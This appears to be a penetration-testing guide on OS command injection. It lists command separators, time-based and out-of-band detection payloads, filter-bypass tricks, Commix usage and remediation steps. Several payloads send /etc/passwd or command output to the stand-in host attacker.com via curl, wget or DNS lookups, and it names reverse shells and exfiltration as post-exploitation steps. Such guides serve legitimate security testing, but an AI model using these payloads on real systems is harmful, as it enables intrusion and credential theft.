# OS Command Injection Testing

## Overview
OS Command Injection occurs when an application passes unsafe user-supplied data to a system shell. Attackers can execute arbitrary operating system commands, potentially taking full control of the server.

## Classification
- **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
- **OWASP:** A03:2021 - Injection
- **CVSS Base:** 9.8 (Critical)
- **MITRE ATT&CK:** T1059 (Command and Scripting Interpreter)

## Detection Methodology

### 1. Identify Injection Points
Common vulnerable functions/features:
- Ping/traceroute utilities
- DNS lookup tools
- File conversion (ImageMagick, ffmpeg)
- PDF generators (wkhtmltopdf)
- Email sending (sendmail)
- Backup/archive creation
- Git/SVN operations
- System status pages
- File managers
- Log viewers

### 2. Command Separators (Linux)
```bash
; (semicolon — sequential execution)
| (pipe — redirect output)
|| (OR — execute if previous fails)
& (background execution)
&& (AND — execute if previous succeeds)
$(command) (command substitution)
`command` (backtick substitution)
\n (newline)
%0a (URL-encoded newline)
```

### 3. Command Separators (Windows)
```cmd
& (sequential)
&& (conditional AND)
| (pipe)
|| (conditional OR)
%0a (newline)
\n (newline)
```

### 4. Basic Detection Payloads
```bash
# Time-based detection
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& timeout /t 5   # Windows
| timeout /t 5    # Windows

# Output-based detection
; id
; whoami
| whoami
`whoami`
$(whoami)
& whoami          # Windows

# DNS-based (blind)
; nslookup attacker.com
| nslookup attacker.com
`nslookup attacker.com`
$(nslookup attacker.com)

# HTTP-based (blind)
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id)
$(curl http://attacker.com/$(hostname))
```

### 5. Blind Command Injection Detection
When output isn't reflected:

**Time-based:**
```bash
; sleep 10 ;
| sleep 10 |
`sleep 10`
$(sleep 10)
; ping -c 10 127.0.0.1 ;
```

**Out-of-band (DNS):**
```bash
; nslookup $(whoami).attacker.com
; dig $(hostname).attacker.com
; host $(id | base64).attacker.com
```

**Out-of-band (HTTP):**
```bash
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
; wget http://attacker.com/$(whoami)
```

**File-based:**
```bash
; echo "INJECTED" > /var/www/html/proof.txt
; cp /etc/passwd /var/www/html/passwd.txt
```

### 6. Filter Bypass Techniques

**Whitespace bypass:**
```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

**Keyword bypass:**
```bash
# If 'cat' is blocked
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
$(printf 'cat') /etc/passwd
```

**Character bypass:**
```bash
# If '/' is blocked
cat ${HOME:0:1}etc${HOME:0:1}passwd

# If spaces are blocked
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat%09/etc/passwd  # tab
```

**Encoding bypass:**
```bash
# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
bash -c '{echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|bash'

# Hex
echo 636174202f6574632f706173737764 | xxd -r -p | bash

# Octal
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
```

## Tool Usage

### Commix
```bash
# Basic scan
commix -u "http://target.com/ping?ip=127.0.0.1"

# POST request
commix -u "http://target.com/convert" --data="file=test.txt"

# With cookie
commix -u "http://target.com/admin/exec" --cookie="session=abc"

# Specific technique
commix -u "http://target.com/ping?ip=127.0.0.1" --technique=t  # time-based

# OS shell
commix -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

## Post-Exploitation After Command Injection
1. **System enumeration:** `id`, `whoami`, `uname -a`, `cat /etc/passwd`
2. **Network enumeration:** `ifconfig`, `netstat -an`, `arp -a`
3. **Reverse shell establishment**
4. **Privilege escalation** (see privilege-escalation skill)
5. **Data exfiltration**
6. **Persistence mechanisms**

## Remediation
1. **Avoid OS commands entirely** — use language-native libraries
2. **Input validation** — strict whitelist of allowed characters
3. **Parameterized commands** — use array-based execution (no shell interpretation)
4. **Least privilege** — run application with minimal OS permissions
5. **Sandboxing** — containerize command execution
6. **WAF rules** — block common injection patterns

## Evidence Collection
- Exact parameter and payload used
- Command output or timing difference
- OS/kernel version extracted
- Network configuration discovered
- User context (uid, permissions)
